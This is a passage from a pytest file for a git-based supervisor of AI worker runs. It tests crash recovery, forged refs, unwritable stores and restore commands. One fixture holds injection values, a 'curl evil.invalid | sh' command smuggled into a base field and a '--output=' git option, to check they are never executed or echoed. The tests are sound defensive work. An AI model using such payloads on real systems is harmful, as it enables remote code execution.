        h.git(repo, "update-ref", "HEAD", step)
    refs = (rev(repo, "HEAD"), rev(repo, name))
    before = store_snapshot(repo)
    if attempt_open:
        code, out = ctl.report(result)
        assert code == 1 and out["refusal"]["code"] == "attempt-refused", out
        assert next_refusal(repo)["code"] == "attempt-residue"
    else:
        request_out = next_ok(repo)["request"]
        assert request_out["reason"] == "history-adoption"
        question = request_out["question"]
        # The provenance is stated as the two things it may be, never as one.
        assert "never recorded" in question and "cut off after its refs moved" in question
        assert "made outside the supervisor" in question
        assert recorded in question and f"git reset --soft {recorded}" in question
        assert step in question or request_out["head_commit"] == step
        if moved == "ref":  # HEAD is on the recorded value: adoption would drop the step
            assert "dropping" in question and "adopt-history" in question
        else:  # the step changes delivery/: adoption would be refused, so it is not offered
            assert "Adoption would be refused" in question and "adopt-history" not in question
        code, out = h.run_cli(
            repo, "start", h.SPEC_DIR, "--intent", "code", "--code-trust", "untrusted",
            "--authority-ref", OWNER, "--review-authority-ref", "plan-reviewer:0123456789ab")
        assert code == 1 and out["refusal"]["code"] == "history-adoption-required", out
        assert f"git reset --soft {recorded}" in out["refusal"]["detail"]
        # Every verb that finds the ref on an unrecorded commit logs a denial; status does not.
        logged = len(security_lines(repo))
        if moved != "head":
            assert any(e["reason_code"] == "unrecorded-product-ref" for e in security_lines(repo))
        h.run_cli(repo, "status", h.SPEC_DIR, "--json")
        assert len(security_lines(repo)) == logged
        status_code, status = h.run_cli(repo, "status", h.SPEC_DIR, "--json")
        assert status_code == 0 and status["request"]["request_id"] == request_out["request_id"]
        assert status["run"]["gate_pending"] is True
    # Nothing counted the commit as made, and no verb moved a ref to it or anywhere else.
    assert step not in _made(repo)
    assert step not in h.workspace(repo).git.made_commits(
        h.workspace(repo).approvals()[0]["run_id"])
    assert (rev(repo, "HEAD"), rev(repo, name)) == refs
    assert {k: v for k, v in store_snapshot(repo).items() if k != "attempts"} == {
        k: v for k, v in before.items() if k != "attempts"}
    # The exit that always works: the printed restore, and the step is rebuilt.
    if attempt_open:
        h.git(repo, "update-ref", "--no-deref", name, recorded)
        h.git(repo, "reset", "-q", "--soft", recorded)
    else:
        run_restore_exit(repo, request_out["question"])
    if attempt_open:
        assert _next_request(repo)["request_id"] == request["request_id"]
        code, admitted = ctl.report(result)
        assert code == 0, admitted
    else:
        assert "request" in next_ok(repo)
    assert_parity(repo)


def _next_request(repo: Path) -> dict[str, Any]:
    return next_ok(repo)["request"]  # type: ignore[no-any-return]


def test_a_refused_step_writes_nothing_and_never_anchors_a_ref_less_run(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    repo = started(tmp_path)
    advance(repo, controller(repo, tmp_path), calc_implement)
    make_legacy(repo)
    base = rev(repo, "HEAD")
    ws = h.workspace(repo)
    run_id = ws.approvals()[0]["run_id"]
    tree = h.git(repo, "rev-parse", "HEAD^{tree}").strip()
    other = h.git(repo, "commit-tree", tree, "-p", base, "-m", "a racing commit").strip()
    seen = spy_steps(monkeypatch)
    before = store_snapshot(repo)
    h.commit_module.set_update_hook(lambda: h.git(repo, "update-ref", "refs/heads/main", other))
    try:
        with pytest.raises(h.commit_module.SupervisorGitError):
            ws.git.build_commit(run_id=run_id, step="refused-step", operation="evidence",
                                summary="refused")
    finally:
        h.commit_module.set_update_hook(None)
    h.git(repo, "update-ref", "refs/heads/main", base)  # the race is undone
    assert store_snapshot(repo) == before, "a refusal wrote to the run store"
    refused = seen[-1]
    assert refused not in h.workspace(repo).git.made_commits(run_id)
    assert "request" in next_ok(repo)  # a recovery verb: it creates the missing ref
    assert record(repo)["recorded"] == base, "the refused commit anchored the run"
    assert rev(repo, "HEAD") == base != refused
    assert rev(repo, ref_name(repo)) == base


@pytest.mark.skipif(os.name == "nt", reason="a read-only directory is how this test fails the store")
def test_a_refusal_with_an_unwritable_store_and_a_forged_ref_never_lands_the_step(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    repo = started(tmp_path)
    ctl = controller(repo, tmp_path)
    request = advance(repo, ctl, calc_implement, after=False)
    result = ctl.work(request)
    name, base = ref_name(repo), rev(repo, "HEAD")
    tree = h.git(repo, "rev-parse", "HEAD^{tree}").strip()
    worker = h.git(repo, "commit-tree", tree, "-p", base, "-m", "worker").strip()
    seen = spy_steps(monkeypatch)
    store = store_dir(repo)

    def race() -> None:  # the worker races the product ref while the run store is read-only
        h.git(repo, "update-ref", name, worker)
        Path(store).chmod(0o555)

    h.commit_module.set_update_hook(race)
    try:
        code, out = ctl.report(result)
    finally:
        h.commit_module.set_update_hook(None)
        Path(store).chmod(0o755)
    assert code == 1 and out["refusal"]["code"] == "integration-conflict", out
    refused = seen[-1]
    h.git(repo, "update-ref", name, refused)  # the worker forges the ref to the refused commit
    code, out = h.run_cli(repo, "next", h.SPEC_DIR)
    assert code == 1 and out["refusal"]["code"] == "attempt-residue", out
    assert refused not in _made(repo)
    assert rev(repo, "HEAD") == base
    h.git(repo, "update-ref", "--no-deref", name, base)
    assert _next_request(repo)["request_id"] == request["request_id"]


@pytest.mark.parametrize("failing", ["record", "everything"])
def test_a_store_write_that_fails_after_the_move_is_the_decision_state(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, failing: str
) -> None:
    repo = started(tmp_path)
    advance(repo, controller(repo, tmp_path), calc_implement)
    ws = h.workspace(repo)
    run_id = ws.approvals()[0]["run_id"]
    recorded, name = rev(repo, "HEAD"), ref_name(repo)
    seen = spy_steps(monkeypatch)

    def store_fails(*args: Any, **kwargs: Any) -> None:
        raise OSError("the store is read-only")

    monkeypatch.setattr(h.commit_module.GitPort, "write_product_record", store_fails)
    if failing == "everything":
        monkeypatch.setattr(h.commit_module.GitPort, "record_made", store_fails)
    with pytest.raises(h.commit_module.SupervisorGitError) as caught:
        ws.git.build_commit(run_id=run_id, step="moved-step", operation="evidence",
                            summary="moved, then the store failed")
    monkeypatch.undo()
    step = seen[-1]
    assert caught.value.code == "denied-product-record"
    assert "OSError" in str(caught.value) and str(store_dir(repo)) in str(caught.value)
    assert "writable" in str(caught.value) and "did not record" in str(caught.value)
    # The refs are where the transaction left them; the run counts nothing it did not record.
    assert rev(repo, "HEAD") == step == rev(repo, name)
    assert step not in _made(repo) and record(repo)["recorded"] == recorded
    request = next_ok(repo)["request"]
    assert request["reason"] == "history-adoption" and step in request["question"]
    assert step not in _made(repo)
    run_restore_exit(repo, request["question"])
    assert "request" in next_ok(repo)
    assert_parity(repo)


def test_a_made_append_that_fails_after_the_record_is_settled_by_the_next_verb(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    repo = started(tmp_path)
    advance(repo, controller(repo, tmp_path), calc_implement)
    ws = h.workspace(repo)
    run_id = ws.approvals()[0]["run_id"]
    seen = spy_steps(monkeypatch)

    def append_fails(self: Any, run: str, sha: str) -> None:
        raise OSError("the store is read-only")

    monkeypatch.setattr(h.commit_module.GitPort, "record_made", append_fails)
    with pytest.raises(h.commit_module.SupervisorGitError) as caught:
        ws.git.build_commit(run_id=run_id, step="landed-step", operation="evidence",
                            summary="landed")
    monkeypatch.undo()
    step = seen[-1]
    assert caught.value.code == "denied-product-record"
    assert str(store_dir(repo)) in str(caught.value) and "made list" in str(caught.value)
    # The product ref record was written first, so the recorded value is the step.
    assert record(repo)["recorded"] == step and step not in _made(repo)
    assert "every verb that reconciles (all but status) retries the append" in str(caught.value)
    assert _named_directory(str(caught.value)) == _nearest_existing(_store_path(repo))
    # A retry that fails too says what it was appending and what the made list lacks.
    monkeypatch.setattr(h.commit_module.GitPort, "record_made", append_fails)
    code, out = h.run_cli(repo, "next", h.SPEC_DIR)
    monkeypatch.undo()
    assert code == 1 and out["refusal"]["code"] == "denied-product-record", out
    assert "appending the recorded commit to the made list" in out["refusal"]["detail"]
    assert f"the product ref record names {step}, which the made list lacks." in (
        out["refusal"]["detail"]
    )
    assert "request" in next_ok(repo)  # the next verb appends the recorded value to the made file
    assert step in _made(repo)


def test_a_first_admissions_made_append_failure_names_start_as_the_exit(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    repo = h.make_repo(tmp_path)

    def append_fails(self: Any, run: str, sha: str) -> None:
        raise OSError("the store is read-only")

    monkeypatch.setattr(h.commit_module.GitPort, "record_made", append_fails)
    code, out = h.start(repo)
    monkeypatch.undo()
    assert code == 1 and out["refusal"]["code"] == "denied-product-record", out
    detail = out["refusal"]["detail"]
    assert "every verb but start refuses supervisor-changed and start retries" in detail
    assert detail.endswith("then run start.") and "run any verb" not in detail
    assert _named_directory(detail) == _nearest_existing(_store_path(repo))
    code, out = h.run_cli(repo, "next", h.SPEC_DIR)  # what the old text promised
    assert code == 1 and out["refusal"]["code"] == "supervisor-changed", out
    assert h.start(repo)[0] == 0  # what the new text promises
    assert "request" in next_ok(repo)


@pytest.mark.parametrize("ref_less", [False, True])
@pytest.mark.parametrize("point", ["commit-built", "refs-moved", "made-recorded"])
def test_a_crash_around_the_move_converges(
    tmp_path: Path, ref_less: bool, point: str
) -> None:
    """Killed before its move, nothing changed. Killed after the move and before its
    recording (``refs-moved``), the run holds a commit it never recorded: the owner's
    decision, with the restore-both exit. Killed after it was recorded, it simply converges."""
    repo = started(tmp_path)
    advance(repo, controller(repo, tmp_path), calc_implement)
    if ref_less:
        make_legacy(repo)
    ws = h.workspace(repo)
    run_id = ws.approvals()[0]["run_id"]
    before = rev(repo, "HEAD")

    def hook(name: str) -> None:
        if name == point:
            raise h.Crash(name)

    h.commit_module.set_kill_hook(hook)
    try:
        with pytest.raises(h.Crash):
            ws.git.build_commit(run_id=run_id, step="crashed-step", operation="evidence",
                                summary="cut off")
    finally:
        h.commit_module.set_kill_hook(None)
    moved = point != "commit-built"
    made_before = _made(repo)
    if not moved:
        # Killed before the transaction: nothing moved, nothing was recorded.
        assert rev(repo, "HEAD") == before and _made(repo) == made_before
        assert "request" in next_ok(repo)
        assert rev(repo, "HEAD") == before and _made(repo) == made_before
        return
    step = rev(repo, "HEAD")
    assert step != before
    payload = next_ok(repo)
    if point == "refs-moved":
        # Recorded run: the ref and HEAD name an unrecorded step. Ref-less: HEAD does.
        question = payload["request"]["question"]
        assert payload["request"]["reason"] == "history-adoption"
        assert step in question or payload["request"]["head_commit"] == step
        assert "update-ref" in question or ref_less
        if ref_less:  # a run with no product ref has only HEAD to reset
            assert f"git reset --soft {before}" in question and "update-ref" not in question
        assert step not in _made(repo)
        run_restore_exit(repo, question)
        assert rev(repo, "HEAD") == before
        assert "request" in next_ok(repo)
        return
    # Killed after the run recorded it: it converges unaided, and the step is the run's own.
    assert "request" in payload and rev(repo, "HEAD") == step
    assert step in h.workspace(repo).git.made_commits(
        h.workspace(repo).approvals()[0]["run_id"])


# ── a run with no recorded product ref, killed past its own move ────────────


def _ref_less_crash(tmp_path: Path, *, attempt_open: bool) -> tuple[Path, Any, Any, str, str]:
    """Kill a ref-less run's step right after its transaction moved HEAD, before it was recorded.

    Such a run has no proof the step landed, so HEAD at that commit is history the
    supervisor did not record: the owner's decision, or residue while an attempt is open.
    """
    repo = started(tmp_path)
    ctl = controller(repo, tmp_path)
    if attempt_open:
        request = advance(repo, ctl, calc_implement, after=False)
    else:
        advance(repo, ctl, calc_implement)
        request = None
    make_legacy(repo)
    before = rev(repo, "HEAD")
    result = ctl.work(request) if request is not None else None
    ws = h.workspace(repo)
    run_id = ws.approvals()[0]["run_id"]

    def hook(name: str) -> None:
        if name == "refs-moved":
            raise h.Crash(name)

    h.commit_module.set_kill_hook(hook)
    try:
        with pytest.raises(h.Crash):
            if result is not None:
                ctl.report(result)
            else:
                ws.git.build_commit(run_id=run_id, step="cut-off", operation="evidence",
                                    summary="cut off")
    finally:
        h.commit_module.set_kill_hook(None)
    assert rev(repo, "HEAD") != before
    return repo, ctl, result, before, request["request_id"] if request else ""


def test_a_ref_less_crash_with_no_attempt_ends_in_the_decision_and_answering_converges(
    tmp_path: Path,
) -> None:
    repo, ctl, _result, before, _ = _ref_less_crash(tmp_path, attempt_open=False)
    moved = rev(repo, "HEAD")
    request = next_ok(repo)["request"]
    assert request["reason"] == "history-adoption" and request["head_commit"] == moved
    assert before in request["question"] and f"git reset --soft {before}" in request["question"]
    assert "update-ref" not in request["question"]  # a run with no product ref has only HEAD
    code, admitted = ctl.report(decision_result(request, moved))
    assert code == 0, admitted
    assert controller(repo, tmp_path).drive().get("terminal")


def test_a_ref_less_crash_with_an_attempt_open_ends_in_residue_and_resetting_converges(
    tmp_path: Path,
) -> None:
    repo, ctl, result, before, request_id = _ref_less_crash(tmp_path, attempt_open=True)
    code, out = h.run_cli(repo, "next", h.SPEC_DIR)
    assert code == 1 and out["refusal"]["code"] == "attempt-residue", out
    assert before in out["refusal"]["detail"] and "move it back" in out["refusal"]["detail"]
    h.git(repo, "update-ref", "refs/heads/main", before)  # the exit the detail names
    again = next_ok(repo)["request"]
    assert again["request_id"] == request_id
    code, admitted = ctl.report(result)
    assert code == 0, admitted


def test_the_decision_for_foreign_delivery_history_names_the_reset_exit(tmp_path: Path) -> None:
    repo = started(tmp_path)
    advance(repo, controller(repo, tmp_path), calc_implement)
    make_legacy(repo)
    anchor = rev(repo, "HEAD")
    foreign_commit(repo, f"{h.SPEC_DIR}/delivery/review-decisions.jsonl", "{}\n")
    request = next_ok(repo)["request"]
    assert "Adoption would be refused" in request["question"]
    assert "adopt-history" not in request["question"]
    assert f"git reset --soft {anchor}" in request["question"]


# ── the first admission: nothing is recorded before its own transaction lands ─


def test_a_refused_first_admission_never_anchors_the_run(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    repo = h.make_repo(tmp_path)
    base = rev(repo, "HEAD")
    tree = h.git(repo, "rev-parse", "HEAD^{tree}").strip()
    other = h.git(repo, "commit-tree", tree, "-p", base, "-m", "a racing commit").strip()
    seen = spy_steps(monkeypatch)
    h.commit_module.set_update_hook(lambda: h.git(repo, "update-ref", "refs/heads/main", other))
    try:
        code, out = h.start(repo)
    finally:
        h.commit_module.set_update_hook(None)
    assert code == 1, out
    refused = seen[-1]
    # Nothing counts it, and someone points HEAD at the approval commit that was refused.
    h.git(repo, "update-ref", "refs/heads/main", refused)
    h.git(repo, "reset", "-q", "--hard", refused)
    code, out = h.start(repo)
    assert code == 1 and out["refusal"]["code"] == "supervisor-changed", out
    assert f"git reset --soft {base}" in out["refusal"]["detail"]
    code, out = h.run_cli(repo, "next", h.SPEC_DIR)
    assert code == 1, out
    assert not git_ok(repo, "for-each-ref", "refs/agentbundle").stdout.strip()
    base_dir = Path(h.git(repo, "rev-parse", "--absolute-git-dir").strip()) / "agentbundle-supervisor"
    assert not list(base_dir.glob("run-*/product-ref")) and not list(base_dir.glob("run-*/made-commits"))
    # The exit it names works: the owner resets and admits again.
    h.git(repo, "reset", "-q", "--soft", base)
    assert h.start(repo)[0] == 0
    assert rev(repo, ref_name(repo)) == rev(repo, "HEAD")


def _kill_first_admission(repo: Path, point: str = "refs-moved") -> None:
    def hook(name: str) -> None:
        if name == point:
            raise h.Crash(name)

    h.commit_module.set_kill_hook(hook)
    try:
        with pytest.raises(h.Crash):
            h.start(repo)
    finally:
        h.commit_module.set_kill_hook(None)


def _printed_first_admission_exit(repo: Path, detail: str) -> str:
    command = detail.split("restore with ", 1)[1].split(", then")[0]
    done = subprocess.run(command, shell=True, cwd=repo, env={**os.environ, **h.GIT_ENV},
                          capture_output=True, text=True, check=False)
    assert done.returncode == 0, done.stderr
    return command


def _nearest_existing(path: Path) -> Path:
    """The nearest directory at or above *path* that exists, found without the code under test."""
    while not path.is_dir():
        path = path.parent
    return path


def _store_path(repo: Path) -> Path:
    """Where the run's store directory belongs, whether or not it exists yet."""
    run_id = h.workspace(repo).approvals()[0]["run_id"]
    git_dir = Path(h.git(repo, "rev-parse", "--absolute-git-dir").strip())
    return git_dir / "agentbundle-supervisor" / run_id


def _named_directory(detail: str) -> Path:
    return Path(detail.split("Make ", 1)[1].split(" writable", 1)[0])


def test_a_first_admission_cut_off_after_its_refs_moved_keeps_uncommitted_work(
    tmp_path: Path,
) -> None:
    repo = h.make_repo(tmp_path)
    base = rev(repo, "HEAD")
    (repo / "README.md").write_text("base\nmy uncommitted work\n", **h._LF)
    _kill_first_admission(repo)
    assert rev(repo, "HEAD") != base
    code, out = h.start(repo)
    assert code == 1 and out["refusal"]["code"] == "supervisor-changed", out
    detail = out["refusal"]["detail"]
    assert "never recorded" in detail and f"git reset --soft {base}" in detail
    assert "--hard" not in detail and "update-ref" not in detail
    orphans = git_ok(repo, "for-each-ref", "--format=%(refname) %(objectname)",
                     "refs/agentbundle").stdout.splitlines()
    assert len(orphans) == 1
    command = _printed_first_admission_exit(repo, detail)
    assert command == f"git reset --soft {base}"
    # The exit kept the dirty tracked file and deleted nothing: the leftover ref is inert.
    assert (repo / "README.md").read_text("utf-8") == "base\nmy uncommitted work\n"
    assert rev(repo, "HEAD") == base
    assert git_ok(repo, "for-each-ref", "--format=%(refname) %(objectname)",
                  "refs/agentbundle").stdout.splitlines() == orphans
    assert h.start(repo)[0] == 0 and rev(repo, "HEAD") != base
    assert (repo / "README.md").read_text("utf-8") == "base\nmy uncommitted work\n"
    assert len(git_ok(repo, "for-each-ref", "refs/agentbundle").stdout.splitlines()) == 2


def test_the_first_admission_exit_leaves_a_sibling_worktrees_run_alone(tmp_path: Path) -> None:
    """Refs are shared by every worktree, and two runs can share a run id."""
    repo = h.make_repo(tmp_path)
    sibling_tree = tmp_path / "sibling"
    h.git(repo, "worktree", "add", "-q", "-b", "sibling", str(sibling_tree))
    assert h.start(repo)[0] == 0
    live = git_ok(repo, "for-each-ref", "--format=%(refname) %(objectname)",
                  "refs/agentbundle").stdout.splitlines()
    live_record = (store_dir(repo) / "product-ref").read_bytes()
    assert len(live) == 1
    _kill_first_admission(sibling_tree)
    code, out = h.start(sibling_tree)
    assert code == 1 and out["refusal"]["code"] == "supervisor-changed", out
    _printed_first_admission_exit(sibling_tree, out["refusal"]["detail"])
    after = git_ok(repo, "for-each-ref", "--format=%(refname) %(objectname)",
                   "refs/agentbundle").stdout.splitlines()
    assert live[0] in after and len(after) == 2
    assert (store_dir(repo) / "product-ref").read_bytes() == live_record
    code, out = h.run_cli(repo, "next", h.SPEC_DIR)
    assert code == 0 and "request" in out, out


def _forge_base(repo: Path, forged: str) -> None:
    """A worker rewrites the approval's base in the committed file."""
    path = repo / h.SPEC_DIR / "delivery" / "approvals.jsonl"
    line = json.loads(path.read_text("utf-8"))
    line["base"] = forged
    path.write_text(json.dumps(line, sort_keys=True) + "\n", **h._LF)


def _forged_base_cases(repo: Path) -> dict[str, str]:
    tree = h.git(repo, "rev-parse", "HEAD^{tree}").strip()
    return {
        "shell": "x; curl evil.invalid | sh #",
        "option": "--output=/tmp/forged",
        "absent": "a" * 40,
        # A commit that exists and nothing refers to, built from HEAD's tree.
        "dangling": h.git(repo, "commit-tree", tree, "-m", "dangling").strip(),
        # A real commit that is not the approval's parent.
        "grandparent": h.git(repo, "rev-parse", "HEAD^").strip(),
    }


@pytest.mark.parametrize(
    "case", ["shell", "option", "absent", "dangling", "grandparent"]
)
def test_an_approval_base_that_is_not_the_approvals_parent_is_never_used(
    tmp_path: Path, case: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    repo = h.make_repo(tmp_path)
    (repo / "extra.txt").write_text("a later commit\n", **h._LF)
    h.git(repo, "add", "extra.txt")
    h.git(repo, "commit", "-q", "-m", "a commit before the approval")
    _kill_first_admission(repo)
    h.git(repo, "reset", "-q", "--hard", "HEAD")
    forged = _forged_base_cases(repo)[case]
    _forge_base(repo, forged)
    h.git(repo, "commit", "-q", "-am", "a forged base")
    marker = Path(forged.split("=", 1)[1]) if forged.startswith("--output=") else None
    seen: list[tuple[Any, ...]] = []
    original = h.commit_module.GitPort.run

    def spy(self: Any, *args: Any, **kwargs: Any) -> Any:
        seen.append(args)
        return original(self, *args, **kwargs)

    monkeypatch.setattr(h.commit_module.GitPort, "run", spy)
    outcomes = {
        verb: h.run_cli(repo, *argv)
        for verb, argv in (
            ("start", ("start", h.SPEC_DIR, "--intent", "code", "--code-trust", "trusted",
                       "--authority-ref", OWNER, "--review-authority-ref",
                       "plan-reviewer:0123456789ab")),
            ("next", ("next", h.SPEC_DIR)),
            ("status", ("status", h.SPEC_DIR, "--json")),
        )
    }
    for verb, (code, out) in outcomes.items():
        text = json.dumps(out)
        refusal = out["refusal"]
        # status answers from the committed records, so it reports and exits 0.
        assert code == (0 if verb == "status" else 1), (verb, out)
        assert refusal["code"] == "supervisor-changed", (verb, out)
        assert forged not in text and "curl" not in text and "--output" not in text, text
        assert "git reset" not in text and "git update-ref" not in text, text
    # start reads the committed record and says no command is named; the others stop at the
    # pin check and point at start.
    start_detail = outcomes["start"][1]["refusal"]["detail"]
    assert "no command is named" in start_detail
    assert "not the parent of the commit at HEAD" in start_detail, start_detail
    status_detail = outcomes["status"][1]["refusal"]["detail"]
    assert "no command is named" in status_detail, status_detail
    # next stops at the pin check, whose text is the plain one: no store directory exists.
    assert outcomes["next"][1]["refusal"]["detail"] == "the supervisor's pin record is missing"
    assert not any(forged in argument for call in seen for argument in call if isinstance(argument, str))
    assert marker is None or not marker.exists()


def test_a_run_whose_made_list_and_product_ref_are_gone_is_measured_from_the_approvals_parent(
    tmp_path: Path,
) -> None:
    """Reaches the first-admission branches of inspect, peek, and reconcile with a valid base."""
    repo = started(tmp_path)
    base = rev(repo, "HEAD^")
    make_legacy(repo)
    (store_dir(repo) / "made-commits").unlink()
    code, status = h.run_cli(repo, "status", h.SPEC_DIR, "--json")  # peek, which writes nothing
    assert code == 0 and status["request"]["reason"] == "history-adoption", status
    assert not (store_dir(repo) / "product-ref").exists()
    assert status["refusal"] == {}
    code, out = h.run_cli(repo, "next", h.SPEC_DIR)  # reconcile
    question = out["request"]["question"]
    assert code == 0 and out["request"]["reason"] == "history-adoption", out
    assert f"git reset --soft {base}" in question and "update-ref -d" not in question
    assert "adopt-history" not in question and "Adoption would be refused" in question


def test_a_run_with_later_steps_and_no_record_is_not_read_as_a_first_admission(
    tmp_path: Path,
) -> None:
    """A run with a later step and a wiped made list and record carries on; nothing is refused."""
    repo = started(tmp_path)
    advance(repo, controller(repo, tmp_path), calc_implement)
    make_legacy(repo)
    (store_dir(repo) / "made-commits").unlink()
    assert not h.workspace(repo).git.approval_only(h.workspace(repo).approvals()[0]["run_id"])
    code, out = h.run_cli(repo, "status", h.SPEC_DIR, "--json")
    assert code == 0 and not out.get("refusal"), out
    code, out = h.run_cli(repo, "next", h.SPEC_DIR)
    assert code == 0 and out["request"]["kind"] == "implement-task", out
    assert "first admission" not in json.dumps(out)


def test_a_finished_run_squashed_into_its_terminal_commit_is_not_a_first_admission(
    tmp_path: Path,
) -> None:
    """One commit keeping only the last step's trailers, on the base, with no store.

    Its single supervisor commit is a terminal one, which only the operation check in
    ``approval_only`` tells from the approval. A squash that keeps the approval's trailers
    (or a fixup folded into the approval) still reads as the approval, and is not told apart.
    """
    repo = started(tmp_path)
    assert h.Controller(repo, tmp_path / "effects.log").drive().get("terminal")
    approval = h.workspace(repo).approvals()[0]["base"]  # the commit the approval was made on
    message = h.git(repo, "log", "-1", "--format=%B").strip()
    assert "Supervisor-Operation: terminal" in message
    tree = h.git(repo, "rev-parse", "HEAD^{tree}").strip()
    squashed = h.git(repo, "commit-tree", tree, "-p", approval, "-m", message).strip()
    h.git(repo, "update-ref", "refs/heads/main", squashed)
    h.git(repo, "reset", "-q", "--hard", squashed)
    shutil.rmtree(store_dir(repo))
    run_id = h.workspace(repo).approvals()[0]["run_id"]
    commits = h.workspace(repo).git.supervisor_commits(run_id)
    assert [c.operation for c in commits] == ["terminal"]
    assert not h.workspace(repo).git.approval_only(run_id)
    for verb in ("status", "start"):
        argv = ("status", h.SPEC_DIR, "--json") if verb == "status" else (
            "start", h.SPEC_DIR, "--intent", "code", "--code-trust", "trusted",
            "--authority-ref", OWNER, "--review-authority-ref", "plan-reviewer:0123456789ab")
        code, out = h.run_cli(repo, *argv)
        text = json.dumps(out)
        assert "git reset --soft" not in text and "first admission" not in text, (verb, out)
        if verb == "status":  # answers the finished run from its committed records
            assert code == 0 and out.get("terminal") is True, out
        else:  # no store, so no pins: the plain refusal, never the first-admission exit
            assert code == 1 and out["refusal"]["code"] == "supervisor-changed", out
            assert out["refusal"]["detail"] == "the supervisor's pin record is missing", out


@pytest.mark.parametrize("state", ["store-built", "approvals-restored"])
def test_every_first_admission_state_refuses_every_verb_and_start_names_the_exit(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, state: str
) -> None:
    repo = h.make_repo(tmp_path)
    base = rev(repo, "HEAD")
    if state == "store-built":

        def half(self: Any, run: str, rec: Any) -> None:
            self.ensure_store(run)  # the directory lands, the record does not
            raise OSError("the record could not be written")

        monkeypatch.setattr(h.commit_module.GitPort, "write_product_record", half)
        code, out = h.start(repo)
        monkeypatch.undo()
        assert code == 1 and out["refusal"]["code"] == "denied-product-record", out
        assert store_dir(repo).is_dir() and not (store_dir(repo) / "product-ref").exists()
    else:
        _kill_first_admission(repo)
        # The approvals file is back in the working tree; the run store was never built.
        h.git(repo, "reset", "-q", "--hard", "HEAD")
        git_dir = Path(h.git(repo, "rev-parse", "--absolute-git-dir").strip())
        assert not list((git_dir / "agentbundle-supervisor").glob("run-*"))
    for verb in ("next", "report"):
        argv = ("report", h.SPEC_DIR, str(tmp_path / "none.json")) if verb == "report" \
            else (verb, h.SPEC_DIR)
        code, out = h.run_cli(repo, *argv)
        assert code == 1 and out["refusal"]["code"] == "supervisor-changed", (verb, out)
        detail = out["refusal"]["detail"]
        if state == "store-built":  # a store directory exists, so the pin check points at start
            assert "run start" in detail, (verb, out)
        else:  # no store: the text a clone of a finished run gets, which cannot be told apart
            assert detail == "the supervisor's pin record is missing", (verb, out)
    code, out = h.run_cli(repo, "status", h.SPEC_DIR, "--json")
    if state == "store-built":
        assert code == 1 and "run start" in out["refusal"]["detail"], out
    else:  # main's no-store exemption: status answers from the committed records
        assert code == 0 and out["request"]["reason"] == "history-adoption", out
        assert f"git reset --soft {base}" in out["request"]["question"], out
        assert not list((git_dir / "agentbundle-supervisor").glob("run-*"))
    code, out = h.start(repo)
    assert code == 1 and out["refusal"]["code"] == "supervisor-changed", out
    assert f"git reset --soft {base}" in out["refusal"]["detail"]
    _printed_first_admission_exit(repo, out["refusal"]["detail"])
    assert h.start(repo)[0] == 0


def test_every_revision_the_supervisor_gives_git_is_a_commit_id(tmp_path: Path) -> None:
    repo = started(tmp_path)
    git = h.workspace(repo).git
    head = rev(repo, "HEAD")
    target = tmp_path / "forged-output"
    for call in (lambda v: git.changed_paths(v, head), lambda v: git.changed_paths(head, v),
                 lambda v: git.is_ancestor(v, head), lambda v: git.rev_list(v, head),
                 lambda v: git.valid_base(v) or git.revision(v)):
        with pytest.raises(h.commit_module.SupervisorGitError):
            call(f"--output={target}")
    assert not target.exists()
    parent = rev(repo, "HEAD^")
    assert git.valid_base("b" * 40) is None and git.valid_base(head) is None
    assert git.valid_base(parent) == parent and git.valid_base(None) is None


def test_a_first_admission_record_failing_after_the_move_says_where_it_leaves_the_run(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    repo = h.make_repo(tmp_path)

    def store_fails(*args: Any, **kwargs: Any) -> None:
        raise OSError("the store could not be built")

    monkeypatch.setattr(h.commit_module.GitPort, "write_product_record", store_fails)
    code, out = h.start(repo)
    monkeypatch.undo()
    assert code == 1 and out["refusal"]["code"] == "denied-product-record", out
    detail = out["refusal"]["detail"]
    assert "first admission" in detail and "supervisor-changed" in detail
    assert "history-adoption" not in detail
    assert _named_directory(detail) == _nearest_existing(_store_path(repo))
    assert "then run start." in detail
    code, out = h.start(repo)  # what the detail promised
    assert code == 1 and out["refusal"]["code"] == "supervisor-changed", out
    _printed_first_admission_exit(repo, out["refusal"]["detail"])
    assert h.start(repo)[0] == 0


def test_an_adoption_record_failing_after_the_move_says_where_it_leaves_the_run(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    repo = started(tmp_path)
    ctl = controller(repo, tmp_path)
    advance(repo, ctl, calc_implement)
    top = foreign_commit(repo)
    request = next_ok(repo)["request"]

    def store_fails(*args: Any, **kwargs: Any) -> None:
        raise OSError("the store is read-only")

    monkeypatch.setattr(h.commit_module.GitPort, "write_product_record", store_fails)
    code, out = ctl.report(decision_result(request, top))
    monkeypatch.undo()
    assert code == 1 and out["refusal"]["code"] == "denied-product-record", out
    detail = out["refusal"]["detail"]
    assert "reanchor" in detail and "product-ref-diverged" in detail
    assert "history-adoption decision" not in detail
    assert _named_directory(detail) == _nearest_existing(_store_path(repo))
    code, out = h.run_cli(repo, "next", h.SPEC_DIR)
    assert code == 1 and out["refusal"]["code"] == "product-ref-diverged", out


def test_an_adoption_on_a_run_with_no_product_ref_says_the_decision_is_asked_again(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    repo = started(tmp_path)
    ctl = controller(repo, tmp_path)
    advance(repo, ctl, calc_implement)
    make_legacy(repo)
    top = foreign_commit(repo)
    request = next_ok(repo)["request"]
    assert request["reason"] == "history-adoption"

    def store_fails(*args: Any, **kwargs: Any) -> None:
        raise OSError("the store is read-only")

    monkeypatch.setattr(h.commit_module.GitPort, "write_product_record", store_fails)
    code, out = ctl.report(decision_result(request, top))
    monkeypatch.undo()
    assert code == 1 and out["refusal"]["code"] == "denied-product-record", out
    detail = out["refusal"]["detail"]
    assert "a reanchor the run did not record, so next asks the history-adoption decision again" in detail
    assert _named_directory(detail) == _nearest_existing(_store_path(repo))


def test_an_invalid_revision_names_the_input_and_never_echoes_it(tmp_path: Path) -> None:
    repo = started(tmp_path)
